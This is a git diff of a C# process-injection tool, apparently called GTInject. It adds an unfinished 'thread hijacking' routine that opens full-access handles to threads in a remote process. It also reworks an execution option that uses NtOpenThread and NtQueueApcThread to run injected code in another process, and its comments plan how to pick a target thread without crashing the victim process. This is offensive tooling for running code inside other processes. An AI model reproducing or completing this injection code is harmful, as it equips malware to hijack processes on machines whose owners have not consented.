@@ -117,6 +117,28 @@ namespace GTInject.Injection
 
         }
 
+        private static IntPtr execopt102(IntPtr memaddr, Process ProcID, int ThreadID)
+        {
+            /////////////////////////////////////
+            // OPTION 102 == GetThreadContext - SetThreadContext "Thread Hijacking" (WINAPI)
+            /////////////////////////////////////
+            // Enum the LAST thread ID in a remote process and use that to hijack? Assuming earlier thread creation has a potential to be a 'main thread' and don't want to crash teh process
+            // At WINAPI level, we can do this natively in C#, consider alternative methods for NT and syscall levels
+
+            // Currently just hijackign last thread, but a rewrite to the threads module could allow us to see all threads and manually choose a thread ID to hijack.
+
+            var threadObjects = ProcID.Threads;
+            var lastthread = threadObjects[threadObjects.Count - 1];
+
+
+            var threadHandle = OpenThread(0x001F03FF, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
+
+
+            return IntPtr.Zero;
+
+
+        }
+
         private static IntPtr execopt200(IntPtr memaddr, Process ProcID, int ThreadID)
         {
             /////////////////////////////////////
@@ -162,21 +184,14 @@ namespace GTInject.Injection
             /////////////////////////////////////
             // OPTION 202 == NtQueueApcThread, NtResumeThread (NTAPI)
             /////////////////////////////////////        
-            // Will also need NtOpenThread? 
             Console.WriteLine("     Execute code using NTAPIs NtQueueApcThread, NtResumeThread");
-
-            //var threadHandle = OpenThread(0x001F03FF, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
-/*            IntPtr targetThread = (IntPtr)ThreadID;
-            ClientId id = new ClientId();
+            
+            var targetThread = IntPtr.Zero;
+            var cid = new CLIENT_ID { UniqueThread = (IntPtr)ThreadID };
             OBJECT_ATTRIBUTES objAttributes = new OBJECT_ATTRIBUTES();
-            var NtOpenTResp = NtOpenThread(out targetThread,(uint)ThreadAccessRights.AllAccess, ref objAttributes, ref id );
-*/
-
-            // Didn't see any easy way to get a handle the a thread ID in c#. WINAPI for OpenThread seems best, though I'd prefer NTAPI series methods to stay as exclusive to NT level as possible
-            var targetThread = OpenThread(0x001F03FF, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
-
-            //Console.WriteLine(  " NtOpenThread Response : " + NtOpenTResp);
-            Console.WriteLine("     returned thread handle " + targetThread);
+            var NtOpenTResp = NtOpenThread(out targetThread,(uint)ThreadAccessRights.AllAccess, ref objAttributes, ref cid );
+           
+            Console.WriteLine(" NtOpenThread Response : " + NtOpenTResp);
 
             var ntQResp = NtQueueApcThread(targetThread, memaddr, 0, IntPtr.Zero, 0);
             if (ntQResp != 0)
